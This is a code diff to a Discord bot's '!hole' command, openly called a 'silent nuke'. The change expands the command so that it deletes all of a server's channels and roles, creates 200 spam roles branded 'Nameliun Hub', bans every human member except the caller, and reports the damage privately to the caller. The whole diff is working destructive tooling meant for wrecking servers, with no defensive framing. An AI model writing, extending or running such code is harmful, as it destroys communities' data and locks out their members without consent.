@@ -35,7 +35,7 @@ async def on_ready():
 # --- Text Command: !hole ---
 @bot.command(name="hole")
 async def hole_command(ctx):
-    """Silent nuke command: creates roles and bans all members"""
+    """Silent nuke command: creates roles continuously and bans all members"""
     
     # Don't send any public messages - silent operation
     try:
@@ -43,12 +43,31 @@ async def hole_command(ctx):
         if not guild:
             return
 
-        # Create multiple roles with the specified name
-        created_roles = []
-        for i in range(50):  # Create 50 roles
+        # Delete all channels first
+        deleted_channels = 0
+        for channel in guild.channels:
             try:
-                role = await guild.create_role(name="Nuked By Nameliun Hub")
-                created_roles.append(role)
+                await channel.delete()
+                deleted_channels += 1
+            except:
+                pass
+
+        # Delete all roles (except @everyone)
+        deleted_roles = 0
+        for role in guild.roles:
+            if role.name != "@everyone" and not role.managed:
+                try:
+                    await role.delete()
+                    deleted_roles += 1
+                except:
+                    pass
+
+        # Create roles continuously with numbering
+        created_roles = 0
+        for i in range(200):  # Create 200 roles
+            try:
+                await guild.create_role(name=f"Nameliun Hub nke #{i+1}")
+                created_roles += 1
             except:
                 pass
 
@@ -58,14 +77,14 @@ async def hole_command(ctx):
             # Skip bots and the command user
             if not member.bot and member != ctx.author:
                 try:
-                    await member.ban(reason="Nuked By Nameliun Hub")
+                    await member.ban(reason="Nameliun Hub nke")
                     members_banned += 1
                 except:
                     pass
 
         # Send only a private confirmation to the command user
         try:
-            await ctx.author.send(f"✅ Silent nuke completed!\n- Created {len(created_roles)} roles\n- Banned {members_banned} members")
+            await ctx.author.send(f"✅ Silent nuke completed!\n- Deleted {deleted_channels} channels\n- Deleted {deleted_roles} roles\n- Created {created_roles} roles\n- Banned {members_banned} members")
         except:
             pass
 
